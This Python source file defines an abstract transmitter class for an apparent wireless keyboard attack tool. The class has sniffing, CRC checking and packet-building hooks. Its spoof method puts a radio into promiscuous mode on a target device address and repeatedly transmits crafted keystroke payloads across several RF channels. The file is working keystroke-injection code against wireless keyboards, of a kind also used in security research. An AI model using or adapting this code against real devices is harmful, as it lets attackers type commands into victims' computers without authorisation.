from abc import ABC, abstractmethod
from lib import common
import time
from binascii import unhexlify

class Tx(ABC):
    # TODO fix channels, is 56 correct ? (fuzz ?) channel size needs to be even to prevent usb error
    CHANNELS = [28, 35, 37, 42, 56, 68, 77, 40]
    RATE = common.RF_RATE_1M
    ADDRESS_LENGTH = 4
    CRC_SIZE = 2
    PACKET_SIZE = 16
    PREAMBLE = b"\xff\xff\xff\xff"

    def __init__(self, address, crc=None):
        self.address = address
        self.crc = crc


    def check_crc(self, expected_crc, crc_input):
        return f"{self.crc(unhexlify(crc_input)):04x}" == expected_crc
    

    def calculate_crc(self, crc_input):
        return self.crc(bytes(crc_input)).to_bytes(2, "big")
    

    @abstractmethod
    def parse_packet(self, packet):
        pass


    @abstractmethod
    def build_packet(self, scancode=[], modifiers=[]):
        pass


    @abstractmethod
    def sniff(self):
        pass
    

    def spoof(self, attack):
        address = unhexlify(self.address.replace(':', ''))
        channel_index = 0
        common.radio.set_channel(self.CHANNELS[channel_index]) # Set channel here to prevent USBError (somehow)
        common.radio.enter_promiscuous_mode_generic(address, rate=self.RATE)

        for i in range(len(self.CHANNELS)): # send whole attack multiple time on every channels
            common.radio.set_channel(self.CHANNELS[i])
            for payload in attack:
                if callable(payload):
                    payload() # in case we want a delay
                else:
                    for _ in range(10):
                        common.radio.transmit_payload_generic(payload=self.PREAMBLE+payload, address=address)
                        time.sleep(0.000001)